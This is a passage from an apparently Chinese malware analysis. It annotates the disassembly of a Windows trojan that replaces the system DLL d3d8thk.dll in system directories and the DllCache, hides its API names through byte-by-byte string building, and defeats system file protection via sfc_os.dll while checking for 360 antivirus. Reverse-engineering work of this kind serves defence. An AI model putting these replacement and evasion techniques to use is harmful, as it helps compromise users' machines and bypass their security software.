004020BE  |.  59                 pop     ecx
004020BF  |.  74 05              je      short 004020C6              ;  如果没找到则跳转
004020C1  |.  6A 01              push    1                           ;  找到，则返回 0
004020C3  |.  8818               mov     byte ptr [eax], bl          ;  截断路径信息，只保留绝对路径，去除文件名
004020C5  |.  5B                 pop     ebx                         ;  ebx = 1
004020C6  |>  8BC3               mov     eax, ebx                    ;  返回值填充，如果找到，则返回 1，如果没找到则返回 0
004020C8  |>  5E                 pop     esi
004020C9  |.  5B                 pop     ebx
004020CA  |.  C9                 leave
004020CB  \.  C3                 retn
```

### 第四段

```



```
00404B47   /$   55                   push    ebp
00404B48   |.   8BEC                 mov     ebp, esp
00404B4A   |.   81EC 9C090000        sub     esp, 99C
00404B50   |.   53                   push    ebx
00404B51   |.   56                   push    esi
00404B52   |.   8B35 00604000        mov     esi, dword ptr [<&kernel32.LoadLibraryA>]    ;  kernel32.LoadLibraryA
00404B58   |.   8D45 9C              lea     eax, dword ptr [ebp-64]
00404B5B   |.   57                   push    edi
00404B5C   |.   50                   push    eax
00404B5D   |.   8D45 F0              lea     eax, dword ptr [ebp-10]
00404B60   |.   33DB                 xor     ebx, ebx                                      ;  ebx=0
00404B62   |.   50                   push    eax                                           ; /FileName
00404B63   |.   C645 F0 4B           mov     byte ptr [ebp-10], 4B                         ; |Kernel32.dll
00404B67   |.   C645 F1 65           mov     byte ptr [ebp-F], 65                          ; |
00404B6B   |.   C645 F2 72           mov     byte ptr [ebp-E], 72                          ; |
00404B6F   |.   C645 F3 6E           mov     byte ptr [ebp-D], 6E                          ; |
00404B73   |.   C645 F4 65           mov     byte ptr [ebp-C], 65                          ; |
00404B77   |.   C645 F5 6C           mov     byte ptr [ebp-B], 6C                          ; |
00404B7B   |.   C645 F6 33           mov     byte ptr [ebp-A], 33                          ; |
00404B7F   |.   C645 F7 32           mov     byte ptr [ebp-9], 32                          ; |
00404B83   |.   C645 F8 2E           mov     byte ptr [ebp-8], 2E                          ; |
00404B87   |.   C645 F9 64           mov     byte ptr [ebp-7], 64                          ; |
00404B8B   |.   C645 FA 6C           mov     byte ptr [ebp-6], 6C                          ; |
00404B8F   |.   C645 FB 6C           mov     byte ptr [ebp-5], 6C                          ; |
00404B93   |.   885D FC              mov     byte ptr [ebp-4], bl                          ; |
00404B96   |.   C645 9C 47           mov     byte ptr [ebp-64], 47                         ; |GetWindowsDirectoryA
00404B9A   |.   C645 9D 65           mov     byte ptr [ebp-63], 65                         ; |
00404B9E   |.   C645 9E 74           mov     byte ptr [ebp-62], 74                         ; |
00404BA2   |.   C645 9F 57           mov     byte ptr [ebp-61], 57                         ; |
00404BA6   |.   C645 A0 69           mov     byte ptr [ebp-60], 69                         ; |
00404BAA   |.   C645 A1 6E           mov     byte ptr [ebp-5F], 6E                         ; |
00404BAE   |.   C645 A2 64           mov     byte ptr [ebp-5E], 64                         ; |
00404BB2   |.   C645 A3 6F           mov     byte ptr [ebp-5D], 6F                         ; |
00404BB6   |.   C645 A4 77           mov     byte ptr [ebp-5C], 77                         ; |
00404BBA   |.   C645 A5 73           mov     byte ptr [ebp-5B], 73                         ; |
00404BBE   |.   C645 A6 44           mov     byte ptr [ebp-5A], 44                         ; |
00404BC2   |.   C645 A7 69           mov     byte ptr [ebp-59], 69                         ; |
00404BC6   |.   C645 A8 72           mov     byte ptr [ebp-58], 72                         ; |
00404BCA   |.   C645 A9 65           mov     byte ptr [ebp-57], 65                         ; |
00404BCE   |.   C645 AA 63           mov     byte ptr [ebp-56], 63                         ; |
00404BD2   |.   C645 AB 74           mov     byte ptr [ebp-55], 74                         ; |
00404BD6   |.   C645 AC 6F           mov     byte ptr [ebp-54], 6F                         ; |
00404BDA   |.   C645 AD 72           mov     byte ptr [ebp-53], 72                         ; |
00404BDE   |.   C645 AE 79           mov     byte ptr [ebp-52], 79                         ; |
00404BE2   |.   C645 AF 41           mov     byte ptr [ebp-51], 41                         ; |
00404BE6   |.   885D B0              mov     byte ptr [ebp-50], bl                         ; |
00404BE9   |.   FFD6                 call    esi                                           ; \\LoadLibraryA
00404BEB   |.   50                   push    eax
00404BEC   |.   E8 40CDFFFF          call    00401931                                      ;  GetProcAddress GetWindowsDirectoryA
00404BF1   |.   59                   pop     ecx
00404BF2   |.   8945 98              mov     dword ptr [ebp-68], eax                      ;  ebp-68 = GetWindowsDirectoryA 地址
00404BF5   |.   59                   pop     ecx
00404BF6   |.   33C0                 xor     eax, eax                                      ;  eax=0
00404BF8   |.   6A 40                push    40
00404BFA   |.   8DBD 65F6FFFF        lea     edi, dword ptr [ebp-99B]
00404C00   |.   5A                   pop     edx                                           ;  edx=0x40
00404C01   |.   889D 64F6FFFF        mov     byte ptr [ebp-99C], bl
00404C07   |.   8BCA                 mov     ecx, edx
0
00404CAA   |.   8BCA                 mov     ecx, edx
00404CAC   |.   33C0                 xor     eax, eax                                      ;  eax=0
00404CAE   |.   8DBD 79FBFFFF        lea     edi, dword ptr [ebp-487]
00404CB4   |.   68 04010000          push    104                                           ;  MAX_PATH
00404CB9   |.   F3:AB                rep     stos dword ptr es:[edi]                       ;  清 0
00404CBB   |.   66:AB                stos    word ptr es:[edi]
00404CBD   |.   AA                   stos    byte ptr es:[edi]
00404CBE   |.   8D85 84FEFFFF        lea     eax, dword ptr [ebp-17C]                      ;  LPTSTR lpBuffer
00404CC4   |.   50                   push    eax
00404CC5   |.   FF55 98              call    dword ptr [ebp-68]                            ;  GetWindowsDirectoryA
00404CC8   |.   8D45 E4              lea     eax, dword ptr [ebp-1C]
00404CCB   |.   C645 E4 5C           mov     byte ptr [ebp-1C], 5C
00404CCF   |.   50                   push    eax
00404CD0   |.   8D85 84FEFFFF        lea     eax, dword ptr [ebp-17C]                      ;  系统目录
00404CD6   |.   50                   push    eax
00404CD7   |.   C645 E5 73           mov     byte ptr [ebp-1B], 73                         ;  system\\
00404CDB   |.   C645 E6 79           mov     byte ptr [ebp-1A], 79
00404CDF   |.   C645 E7 73           mov     byte ptr [ebp-19], 73
00404CE3   |.   C645 E8 74           mov     byte ptr [ebp-18], 74
00404CE7   |.   C645 E9 65           mov     byte ptr [ebp-17], 65
00404CEB   |.   C645 EA 6D           mov     byte ptr [ebp-16], 6D
00404CEF   |.   C645 EB 5C           mov     byte ptr [ebp-15], 5C
00404CF3   |.   885D EC              mov     byte ptr [ebp-14], bl
00404CF6   |.   E8 4ACAFFFF          call    00401745                                      ;  strcat "系统目录\\system\\"
00404CFB   |.   FF75 08              push    dword ptr [ebp+8]                             ;  "d3d8thk.dll"
00404CFE   |.   8D85 84FEFFFF        lea     eax, dword ptr [ebp-17C]                      ;  "系统目录\\system\\"
00404D04   |.   50                   push    eax
00404D05   |.   E8 3BCAFFFF          call    00401745                                      ;  strcat "系统目录\\system\\d3d8thk.dll"
00404D0A   |.   8D85 84FEFFFF        lea     eax, dword ptr [ebp-17C]                      ;  "系统目录\\system\\d3d8thk.dll"
00404D10   |.   50                   push    eax
00404D11   |.   8D85 78FBFFFF        lea     eax, dword ptr [ebp-488]                      ;  "系统目录\\system\\d3d8thk.dll"
00404D17   |.   50                   push    eax
00404D18   |.   E8 31C9FFFF          call    0040164E                                      ;  strcpy
00404D1D   |.   8D85 84FEFFFF        lea     eax, dword ptr [ebp-17C]
00404D23   |.   50                   push    eax
00404D24   |.   8D85 6CF8FFFF        lea     eax, dword ptr [ebp-794]                      ;  "系统目录\\system\\d3d8thk.dll"
00404D2A   |.   50                   push    eax
00404D2B   |.   E8 1EC9FFFF          call    0040164E                                      ;  strcpy
00404D30   |.   8D85 6CF8FFFF        lea     eax, dword ptr [ebp-794]
00404D36   |.   68 14704000          push    00407014                                      ;  ASCII ".dat"
00404D3B   |.   50                   push    eax
00404D3C   |.   E8 04CAFFFF          call    00401745                                      ;  strcat "系统目录\\system\\d3d8thk.dll.dat"
00404D41   |.   33C0                 xor     eax, eax                                      ;  eax=0
00404D43   |.   8D7D 89              lea     edi, dword ptr [ebp-77]
00404D46   |.   AB                   stos    dword ptr es:[edi]                            ;  填 0
00404D47   |.   AB                   stos    dword ptr es:[edi]
00404D48   |.   AB                   stos    dword ptr es:[edi]
00404D49   |.   66:AB                stos    word ptr es:[edi]
00404D4B   |.   AA                   stos    byte ptr es:[edi]
00404D4C   |.   53                   push    ebx                                           ; /timer
00404D4D   |.   C645 88 2E           mov     byte ptr [ebp-78], 2E                         ; |‘.’
00404D51   |.   FF15 90604000        call    dword ptr [<&MSVCRT.time>]                   ; \\time
00404D57   |.   50                   push    eax                                           ; /seed
00404D58   |.   FF15 8C604000        call    dword ptr [<&MSVCRT.srand>]                  ; \\srand
00404D5E   |.   83C4 30              add     esp, 30
00404D61   |.   6A 01                push    1
00404D63   |.   5F                   pop     edi                                           ;  edi=1
00404D64   |>   FF15 88604000        /call   dword ptr [<&MSVCRT.rand>]                  ; [rand
00404D6A   |.   6A 1A                |push    1A
00404D6C       99                   cdq
00404D6D   |.   59                   |pop     ecx                                         ;  ecx=0x1a
00404D6E   |.   F7F9                 |idiv    ecx
00404D70   |.   80C2 41              |add     dl, 41
00404D73   |.   88543D 88            |mov     byte ptr [ebp+edi-78], dl
00404D77   |.   47                   |inc     edi
00404D78   |.   83FF 05              |cmp     edi, 5
00404D7B   |.^  7C E7                \\jl      short 00404D64                              ;  一个循环，生成 4 个随即大写字符
00404D7D   |.   8D45 88              lea     eax, dword ptr [ebp-78]                      ;  .\*\*\*\*（4 个随即大写字符）
00404D80   |.   885C3D 89            mov     byte ptr [ebp+edi-77], bl
00404D84   |.   50                   push    eax
00404D85   |.   8D85 78FBFFFF        lea     eax, dword ptr [ebp-488]
00404D8B   |.   50                   push    eax                                           ;  "系统目录\\system\\d3d8thk.dll.\*\*\*\*（4 个随即大写字符）"
00404D8C   |.   E8 B4C9FFFF          call    00401745                                      ;  strcat
00404D91   |.   8D85 64F6FFFF        lea     eax, dword ptr [ebp-99C]
00404D97   |.   50                   push    eax
00404D98   |.   E8 CECAFFFF          call    0040186B                                      ;  系统目录
00404D9D   |.   8D85 64F6FFFF        lea     eax, dword ptr [ebp-99C]                      ;  系统目录
00404DA3   |.   C645 CC 44           mov     byte ptr [ebp-34], 44
00404DA7   |.   50                   push    eax
00404DA8   |.   8D85 80FDFFFF        lea     eax, dword ptr [ebp-280]
00404DAE   |.   50                   push    eax
00404DAF   |.   C645 CD 6C           mov     byte ptr [ebp-33], 6C                         ;  DllCache\\
00404DB3   |.   C645 CE 6C           mov     byte ptr [ebp-32], 6C
00404DB7   |.   C645 CF 43           mov     byte ptr [ebp-31], 43
00404DBB   |.   C645 D0 61           mov     byte ptr [ebp-30], 61
00404DBF   |.   C645 D1 63           mov     byte ptr [ebp-2F], 63
00404DC3   |.   C645 D2 68           mov     byte ptr [ebp-2E], 68
00404DC7   |.   C645 D3 65           mov     byte ptr [ebp-2D], 65
00404DCB   |.   C645 D4 5C           mov     byte ptr [ebp-2C], 5C
00404DCF   |.   885D D5              mov     byte ptr [ebp-2B], bl
00404DD2   |.   E8 77C8FFFF          call    0040164E                                      ;  strcpy
00404DD7   |.   8D45 CC              lea     eax, dword ptr [ebp-34]
00404DDA   |.   50                   push    eax
00404DDB   |.   8D85 80FDFFFF        lea     eax, dword ptr [ebp-280]                      ;  系统目录
00404DE1   |.   50                   push    eax
00404DE2   |.   E8 5EC9FFFF          call    00401745                                      ;  strcat 系统目录\\DllCache\\
00404DE7   |.   FF75 08              push    dword ptr [ebp+8]                             ;  "d3d8thk.dll"
00404DEA   |.   8D85 80FDFFFF        lea     eax, dword ptr [ebp-280]
00404DF0   |.   50                   push    eax                                           ;  系统目录\\DllCache\\
00404DF1   |.   E8 4FC9FFFF          call    00401745                                      ;  strcat
00404DF6   |.   8D85 80FDFFFF        lea     eax, dword ptr [ebp-280]                      ;  系统目录\\DllCache\\d3d8thk.dll
00404DFC   |.   50                   push    eax
00404DFD   |.   8D85 68F7FFFF        lea     eax, dword ptr [ebp-898]
00404E03   |.   50                   push    eax
00404E04   |.   E8 45C8FFFF          call    0040164E                                      ;  strcpy
00404E09   |.   8D45 88              lea     eax, dword ptr [ebp-78]                      ;  .\*\*\*\*（4 个随即大写字符）
00404E0C   |.   50                   push    eax
00404E0D   |.   8D85 68F7FFFF        lea     eax, dword ptr [ebp-898]                      ;  系统目录\\DllCache\\d3d8thk.dll
00404E13   |.   50                   push    eax
00404E14   |.   E8 2CC9FFFF          call    00401745                                      ;  strcat
00404E19   |.   8D85 64F6FFFF        lea     eax, dword ptr [ebp-99C]                      ;  系统目录
00404E1F   |.   50                   push    eax
00404E20   |.   8D85 7CFCFFFF        lea     eax, dword ptr [ebp-384]                      ;  系统目录
00404E26   |.   50                   push    eax
00404E27   |.   E8 22C8FFFF          call    0040164E                                      ;  strcpy
00404E2C   |.   FF75 08              push    dword ptr [ebp+8]                             ;  "d3d8thk.dll"
00404E2F   |.   8D85 7CFCFFFF        lea     eax, dword ptr [ebp-384]
00404E35   |.   50                   push    eax                                           ;  系统目录
00404E36   |.   E8 0AC9FFFF          call    00401745                                      ;  strcat
00404E3B   |.   83C4 44              add     esp, 44
00404E3E   |.   8D85 7CFCFFFF        lea     eax, dword ptr [ebp-384]                      ;  "系统目录\\d3d8thk.dll"
00404E44   |.   50                   push    eax
00404E45   |.   8D85 70F9FFFF        lea     eax, dword ptr [ebp-690]                      ;  "系统目录\\d3d8thk.dll"
00404E4B   |.   50                   push    eax
00404E4C   |.   E8 FDC7FFFF          call    0040164E                                      ;  strcpy
00404E51   |.   8D85 7CFCFFFF        lea     eax, dword ptr [ebp-384]                      ;  "系统目录\\d3d8thk.dll"
00404E57   |.   50                   push    eax
00404E58   |.   8D85 74FAFFFF        lea     eax, dword ptr [ebp-58C]                      ;  "系统目录\\d3d8thk.dll"
00404E5E   |.   50                   push    eax
00404E5F   |.   E8 EAC7FFFF          call    0040164E                                      ;  strcpy
00404E64   |.   8D45 88              lea     eax, dword ptr [ebp-78]                      ;  .\*\*\*\*（4 个随即大写字符）
00404E67   |.   50                   push    eax
00404E68   |.   8D85 70F9FFFF        lea     eax, dword ptr [ebp-690]
00404E6E   |.   50                   push    eax                                           ;  "系统目录\\d3d8thk.dll"
00404E6F   |.   E8 D1C8FFFF          call    00401745                                      ;  strcat  "系统目录\\d3d8thk.dll.\*\*\*\*（4 个随即大写字符）"
00404E74   |.   8D85 74FAFFFF        lea     eax, dword ptr [ebp-58C]
00404E7A   |.   68 14704000          push    00407014                                      ;  ASCII ".dat"
00404E7F   |.   50                   push    eax                                           ;  "系统目录\\d3d8thk.dll"
00404E80   |.   E8 C0C8FFFF          call    00401745                                      ;  strcat  "系统目录\\d3d8thk.dll.dat"
00404E85   |.   8D85 7CFCFFFF        lea     eax, dword ptr [ebp-384]
00404E8B   |.   50                   push    eax                                           ;  "系统目录\\d3d8thk.dll"
00404E8C   |.   E8 DEC8FFFF          call    0040176F                                      ;  判断指定文件是否存在 （一个参数） 不存在则返回 0
00404E91   |.   8945 98              mov     dword ptr [ebp-68], eax                      ;  ebp-68 中保存"系统目录\\d3d8thk.dll"查询结果
00404E94   |.   8D85 74FAFFFF        lea     eax, dword ptr [ebp-58C]
00404E9A   |.   50                   push    eax                                           ;  "系统目录\\d3d8thk.dll.dat"
00404E9B   |.   E8 CFC8FFFF          call    0040176F                                      ;  判断指定文件是否存在 （一个参数） 不存在则返回 0
00404EA0   |.   83C4 28              add     esp, 28
00404EA3   |.   85C0                 test    eax, eax
00404EA5   |.   75 07                jnz     short 00404EAE
00404EA7   |.   32C0                 xor     al, al
00404EA9   |.   E9 32020000          jmp     004050E0
00404EAE   |>   8D45 D8              lea     eax, dword ptr [ebp-28]
00404EB1   |.   C645 D8 43           mov     byte ptr [ebp-28], 43
00404EB5   |.   50                   push    eax
00404EB6   |.   8D45 F0              lea     eax, dword ptr [ebp-10]
00404EB9   |.   50                   push    eax
00404EBA   |.   C645 D9 6F           mov     byte ptr [ebp-27], 6F                         ;  CopyFileA
00404EBE   |.   C645 DA 70           mov     byte ptr [ebp-26], 70
00404EC2   |.   C645 DB 79           mov     byte ptr [ebp-25], 79
00404EC6   |.   C645 DC 46           mov     byte ptr [ebp-24], 46
00404ECA   |.   C645 DD 69           mov     byte ptr [ebp-23], 69
00404ECE   |.   C645 DE 6C           mov     byte ptr [ebp-22], 6C
00404ED2   |.   C645 DF 65           mov     byte ptr [ebp-21], 65
00404ED6   |.   C645 E0 41           mov     byte ptr [ebp-20], 41
00404EDA   |.   885D E1              mov     byte ptr [ebp-1F], bl
00404EDD   |.   C645 B4 4D           mov     byte ptr [ebp-4C], 4D                         ;  MoveFileExA
00404EE1   |.   C645 B5 6F           mov     byte ptr [ebp-4B], 6F
00404EE5   |.   C645 B6 76           mov     byte ptr [ebp-4A], 76
00404EE9   |.   C645 B7 65           mov     byte ptr [ebp-49], 65
00404EED   |.   C645 B8 46           mov     byte ptr [ebp-48], 46
00404EF1   |.   C645 B9 69           mov     byte ptr [ebp-47], 69
00404EF5   |.   C645 BA 6C           mov     byte ptr [ebp-46], 6C
00404EF9   |.   C645 BB 65           mov     byte ptr [ebp-45], 65
00404EFD   |.   C645 BC 45           mov     byte ptr [ebp-44], 45
00404F01   |.   C645 BD 78           mov     byte ptr [ebp-43], 78
00404F05   |.   C645 BE 41           mov     byte ptr [ebp-42], 41
00404F09   |.   885D BF              mov     byte ptr [ebp-41], bl
00404F0C   |.   FFD6                 call    esi                                           ;  LoadLibrary
00404F0E   |.   50                   push    eax
00404F0F   |.   E8 1DCAFFFF          call    00401931                                      ;  GetProcAddress CopyFileA
00404F14   |.   59                   pop     ecx
00404F15   |.   8945 08              mov     dword ptr [ebp+8], eax                      ;  ebp+8 CopyFileA
00404F18   |.   59                   pop     ecx
00404F19   |.   8D45 B4              lea     eax, dword ptr [ebp-4C]
00404F1C   |.   50                   push    eax
00404F1D   |.   8D45 F0              lea     eax, dword ptr [ebp-10]
00404F20   |.   50                   push    eax
00404F21   |.   FFD6                 call    esi                                           ;  LoadLibrary
00404F23   |.   50                   push    eax
00404F24   |.   E8 08CAFFFF          call    00401931                                      ;  GetProcAddress MoveFileExA
00404F29   |.   8BF8                 mov     edi, eax                                      ;  edi = MoveFileExA
00404F2B   |.   8D85 84FEFFFF        lea     eax, dword ptr [ebp-17C]                      ;  "系统目录\\system\\d3d8thk.dll"
00404F31   |.   50                   push    eax
00404F32   |.   E8 38C8FFFF          call    0040176F                                      ;  判断指定文件是否存在 （一个参数） 不存在则返回 0
00404F37   |.   83C4 0C              add     esp, 0C
00404F3A   |.   85C0                 test    eax, eax
00404F3C   |.   74 2E                je      short 00404F6C
00404F3E   |.   8D85 78FBFFFF        lea     eax, dword ptr [ebp-488]
00404F44   |.   6A 01                push    1
00404F46   |.   50                   push    eax                                           ;  "系统目录\\system\\d3d8thk.dll.\*\*\*\*（4 个随即大写字符）"
00404F47   |.   8D85 84FEFFFF        lea     eax, dword ptr [ebp-17C]
00404F4D   |.   50                   push    eax                                           ;  "系统目录\\system\\d3d8thk.dll"
00404F4E   |.   E8 89FAFFFF          call    004049DC
00404F53   |.   83C4 0C              add     esp, 0C
00404F56   |.   84C0                 test    al, al
00404F58   |.   74 12                je      short 00404F6C
00404F5A   |.   8D85 78FBFFFF        lea     eax, dword ptr [ebp-488]
00404F60   |.   6A 03                push    3                                             ;  MOVEFILE_COPY_ALLOWED | MOVEFILE_REPLACE_EXISTING
00404F62   |.   50                   push    eax                                           ;  "系统目录\\system\\d3d8thk.dll.\*\*\*\*（4 个随即大写字符）"
00404F63   |.   8D85 84FEFFFF        lea     eax, dword ptr [ebp-17C]                      ;  "系统目录\\system\\d3d8thk.dll"
00404F69   |.   50                   push    eax
00404F6A   |.   FFD7                 call    edi                                           ;  MoveFileExA
00404F6C   |>   395D 98              cmp     dword ptr [ebp-68], ebx
00404F6F   |.   74 78                je      short 00404FE9
00404F71   |.   8D45 C0              lea     eax, dword ptr [ebp-40]
00404F74   |.   C645 C0 44           mov     byte ptr [ebp-40], 44
00404F78   |.   50                   push    eax
00404F79   |.   8D45 F0              lea     eax, dword ptr [ebp-10]
00404F7C   |.   50                   push    eax
00404F7D   |.   C645 C1 65           mov     byte ptr [ebp-3F], 65                         ;  DeleteFileA
00404F81   |.   C645 C2 6C           mov     byte ptr [ebp-3E], 6C
00404F85   |.   C645 C3 65           mov     byte ptr [ebp-3D], 65
00404F89   |.   C645 C4 74           mov     byte ptr [ebp-3C], 74
00404F8D   |.   C645 C5 65           mov     byte ptr [ebp-3B], 65
00404F91   |.   C645 C6 46           mov     byte ptr [ebp-3A], 46
00404F95   |.   C645 C7 69           mov     byte ptr [ebp-39], 69
00404F99   |.   C645 C8 6C           mov     byte ptr [ebp-38], 6C
00404F9D   |.   C645 C9 65           mov     byte ptr [ebp-37], 65
00404FA1   |.   C645 CA 41           mov     byte ptr [ebp-36], 41
00404FA5   |.   885D CB              mov     byte ptr [ebp-35], bl
00404FA8   |.   FFD6                 call    esi
00404FAA   |.   50                   push    eax
00404FAB   |.   E8 81C9FFFF          call    00401931                                      ;  GetProcAddress DeleteFileA
00404FB0   |.   59                   pop     ecx
00404FB1   |.   59                   pop     ecx
00404FB2   |.   8D8D 70F9FFFF        lea     ecx, dword ptr [ebp-690]
00404FB8   |.   51                   push    ecx                                           ;  "系统目录\\d3d8thk.dll.\*\*\*\*（4 个随即大写字符）"
00404FB9   |.   FFD0                 call    eax                                           ;  DeleteFileA
00404FBB   |.   8D85 70F9FFFF        lea     eax, dword ptr [ebp-690]
00404FC1   |.   6A 01                push    1
00404FC3   |.   50                   push    eax
00404FC4   |.   8D85 7CFCFFFF        lea     eax, dword ptr [ebp-384]
00404FCA   |.   50                   push    eax
00404FCB   |.   E8 0CFAFFFF          call    004049DC
00404FD0   |.   83C4 0C              add     esp, 0C
00404FD3   |.   84C0                 test    al, al
00404FD5   |.   74 12                je      short 00404FE9
00404FD7   |.   8D85 70F9FFFF        lea     eax, dword ptr [ebp-690]
00404FDD   |.   6A 01                push    1                                             ;  MOVEFILE_REPLACE_EXISTING
00404FDF   |.   50                   push    eax                                           ;  "系统目录\\d3d8thk.dll.\*\*\*\*（4 个随即大写字符）"
00404FE0   |.   8D85 7CFCFFFF        lea     eax, dword ptr [ebp-384]
00404FE6   |.   50                   push    eax                                           ;  "系统目录\\d3d8thk.dll"
00404FE7   |.   FFD7                 call    edi                                           ;  MoveFileExA
00404FE9   |>   8D85 80FDFFFF        lea     eax, dword ptr [ebp-280]                      ;  系统目录\\DllCache\\d3d8thk.dll
00404FEF   |.   50                   push    eax
00404FF0   |.   E8 7AC7FFFF          call    0040176F                                      ;  判断指定文件是否存在 （一个参数） 不存在则返回 0
00404FF5   |.   85C0                 test    eax, eax
00404FF7   |.   59                   pop     ecx
00404FF8   |.   74 32                je      short 0040502C
00404FFA   |.   8D85 68F7FFFF        lea     eax, dword ptr [ebp-898]
00405000   |.   6A 01                push    1
00405002   |.   50                   push    eax                                           ;  系统目录\\DllCache\\d3d8thk.dll.\*\*\*\*（4 个随即大写字符）
00405003   |.   8D85 80FDFFFF        lea     eax, dword ptr [ebp-280]                      ;  系统目录\\DllCache\\d3d8thk.dll
00405009   |.   50                   push    eax
0040500A   |.   E8 CDF9FFFF          call    004049DC                                      ;  使允许修改系统文件
0040500F   |.   83C4 0C              add     esp, 0C
00405012   |.   84C0                 test    al, al
00405014   |.   74 16                je      short 0040502C
00405016   |.   8D85 68F7FFFF        lea     eax, dword ptr [ebp-898]
0040501C   |.   6A 03                push    3
0040501E   |.   50                   push    eax                                           ;  系统目录\\DllCache\\d3d8thk.dll.\*\*\*\*（4 个随即大写字符）
0040501F   |.   8D85 80FDFFFF        lea     eax, dword ptr [ebp-280]
00405025   |.   50                   push    eax                                           ;  系统目录\\DllCache\\d3d8thk.dll
00405026   |.   C645 FF 01           mov     byte ptr [ebp-1], 1
0040502A   |.   FFD7                 call    edi                                           ;  MoveFileExA
0040502C   |>   8D85 84FEFFFF        lea     eax, dword ptr [ebp-17C]                      ;  "系统目录\\system\\d3d8thk.dll"
00405032   |.   50                   push    eax
00405033   |.   E8 37C7FFFF          call    0040176F                                      ;  判断指定文件是否存在 （一个参数） 不存在则返回 0
00405038   |.   85C0                 test    eax, eax
0040503A   |.   59                   pop     ecx
0040503B   |.   74 2E                je      short 0040506B
0040503D   |.   8D85 78FBFFFF        lea     eax, dword ptr [ebp-488]
00405043   |.   6A 01                push    1
00405045   |.   50                   push    eax
00405046   |.   8D85 84FEFFFF        lea     eax, dword ptr [ebp-17C]
0040504C   |.   50                   push    eax
0040504D   |.   E8 8AF9FFFF          call    004049DC
00405052   |.   83C4 0C              add     esp, 0C
00405055   |.   84C0                 test    al, al
00405057   |.   74 12                je      short 0040506B
00405059   |.   8D85 78FBFFFF        lea     eax, dword ptr [ebp-488]
0040505F   |.   6A 03                push    3
00405061   |.   50                   push    eax
00405062   |.   8D85 84FEFFFF        lea     eax, dword ptr [ebp-17C]
00405068   |.   50                   push    eax
00405069   |.   FFD7                 call    edi
0040506B   |>   8D85 6CF8FFFF        lea     eax, dword ptr [ebp-794]                      ;  "系统目录\\system\\d3d8thk.dll.dat"
00405071   |.   53                   push    ebx
00405072   |.   50                   push    eax
00405073   |.   8D85 74FAFFFF        lea     eax, dword ptr [ebp-58C]                      ;  "系统目录\\d3d8thk.dll.dat"
00405079   |.   50                   push    eax
0040507A   |.   FF55 08              call    dword ptr [ebp+8]                             ;  CopyFileA
0040507D   |.   85C0                 test    eax, eax
0040507F   |.   74 2E                je      short 004050AF
00405081   |.   8D85 84FEFFFF        lea     eax, dword ptr [ebp-17C]
00405087   |.   6A 02                push    2
00405089   |.   50                   push    eax
0040508A   |.   8D85 6CF8FFFF        lea     eax, dword ptr [ebp-794]
00405090   |.   50                   push    eax
00405091   |.   E8 46F9FFFF          call    004049DC                                      ;  使系统文件可以修改
00405096   |.   83C4 0C              add     esp, 0C
00405099   |.   84C0                 test    al, al
0040509B   |.   74 12                je      short 004050AF
0040509D   |.   8D85 84FEFFFF        lea     eax, dword ptr [ebp-17C]
004050A3   |.   6A 03                push    3
004050A5   |.   50                   push    eax                                           ;  "系统目录\\system\\d3d8thk.dll"
004050A6   |.   8D85 6CF8FFFF        lea     eax, dword ptr [ebp-794]                      ;  "系统目录\\system\\d3d8thk.dll.dat"
004050AC   |.   50                   push    eax
004050AD   |.   FFD7                 call    edi                                           ;  MoveFileExA
004050AF   |>   385D FF              cmp     byte ptr [ebp-1], bl
004050B2   |.   74 2A                je      short 004050DE
004050B4   |.   8D85 80FDFFFF        lea     eax, dword ptr [ebp-280]
004050BA   |.   6A 02                push    2
004050BC   |.   50                   push    eax
004050BD   |.   8D85 80FDFFFF        lea     eax, dword ptr [ebp-280]
004050C3   |.   50                   push    eax
004050C4   |.   E8 13F9FFFF          call    004049DC                                      ;  使系统文件可以修改
004050C9   |.   83C4 0C              add     esp, 0C
004050CC   |.   8D85 80FDFFFF        lea     eax, dword ptr [ebp-280]                      ;  系统目录\\DllCache\\d3d8thk.dll
004050D2   |.   53                   push    ebx
004050D3   |.   50                   push    eax
004050D4   |.   8D85 74FAFFFF        lea     eax, dword ptr [ebp-58C]                      ;  "系统目录\\d3d8thk.dll.dat"
004050DA   |.   50                   push    eax
004050DB   |.   FF55 08              call    dword ptr [ebp+8]                             ;  CopyFileA
004050DE   |>   B0 01                mov     al, 1
004050E0   |>   5F                   pop     edi
004050E1   |.   5E                   pop     esi
004050E2   |.   5B                   pop     ebx
004050E3   |.   C9                   leave
004050E4   \\.   C3                   retn
```



## 第五段

该段代码作用是突破系统文件保护，其中针对 `360` 做了特殊的处理，具体请看代码

代码:

```
004049DC  /$  55                     push    ebp
004049DD  |.  8BEC                   mov     ebp, esp
004049DF  |.  83EC 44                sub     esp, 44
004049E2  |.  53                     push    ebx
004049E3  |.  8D45 DC                lea     eax, dword ptr [ebp-24]
004049E6  |.  33DB                   xor     ebx, ebx                                   ;  ebx=0
004049E8  |.  50                     push    eax
004049E9  |.  C645 DC 33             mov     byte ptr [ebp-24], 33                        ;  360tray.exe
004049ED  |.  C645 DD 36             mov     byte ptr [ebp-23], 36
004049F1  |.  C645 DE 30             mov     byte ptr [ebp-22], 30
004049F5  |.  C645 DF 74             mov     byte ptr [ebp-21], 74
004049F9  |.  C645 E0 72             mov     byte ptr [ebp-20], 72
004049FD  |.  C645 E1 61             mov     byte ptr [ebp-1F], 61
00404A01  |.  C645 E2 79             mov     byte ptr [ebp-1E], 79
00404A05  |.  C645 E3 2E             mov     byte ptr [ebp-1D], 2E
00404A09  |.  C645 E4 65             mov     byte ptr [ebp-1C], 65
00404A0D  |.  C645 E5 78             mov     byte ptr [ebp-1B], 78
00404A11  |.  C645 E6 65             mov     byte ptr [ebp-1A], 65
00404A15  |.  885D E7                mov     byte ptr [ebp-19], bl
00404A18  |.  E8 E3C5FFFF            call    00401000                                     ;  找到 360 进程并返回 PID
00404A1D  |.  85C0                   test    eax, eax
00404A1F  |.  59                     pop     ecx
00404A20  |.  75 0E                  jnz     short 00404A30
00404A22  |.  FF75 08                push    dword ptr [ebp+8]
00404A25  |.  E8 2DFAFFFF            call    00404457                                     ;  躲避 360 的检查，调用 sfc_os.dll5 号函数，使系统文件可以修改
00404A2A  |.  59                     pop     ecx
00404A2B  |.  E9 F8000000            jmp     00404B28
00404A30  |>  8D45 F4                lea     eax, dword ptr [ebp-C]
00404A33  |.  C645 F4 63             mov     byte ptr [ebp-C], 63                           ;  conime.exe
00404A37  |.  50                     push    eax
00404A38  |.  C645 F5 6F             mov     byte ptr [ebp-B], 6F
00404A3C  |.  C645 F6 6E             mov     byte ptr [ebp-A], 6E
00404A40  |.  C645 F7 69             mov     byte ptr [ebp-9], 69
